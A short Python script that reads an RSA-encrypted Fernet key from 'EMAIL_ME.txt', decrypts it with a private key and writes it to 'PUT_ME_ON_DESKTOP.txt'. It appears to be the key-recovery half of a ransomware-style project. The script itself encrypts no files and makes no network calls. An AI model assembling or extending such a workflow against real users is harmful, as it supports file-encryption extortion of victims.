from cryptography.fernet import Fernet  # Import Fernet for symmetric encryption/decryption
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP  # Import PKCS1_OAEP for RSA decryption

# In the terminal, you can install the required library with:
# pip install pycryptodome

with open('EMAIL_ME.txt', 'rb') as f:
    enc_Fernet_key = f.read()
    print(enc_Fernet_key)

# Private RSA key
private_key = RSA.import_key(open('private.pem').read())

# Private decrypter
private_crypter = PKCS1_OAEP.new(private_key)

# Decrypted session key
dec_Fernet_key = private_crypter.decrypt(enc_Fernet_key)
with open('PUT_ME_ON_DESKTOP.txt', 'wb') as f:
    f.write(dec_Fernet_key)

print(f'> Private key: {private_key}')
print(f'> Private decrypter: {private_crypter}')
print(f'> Decrypted Fernet key: {dec_Fernet_key}')
print('> Decryption Completed')
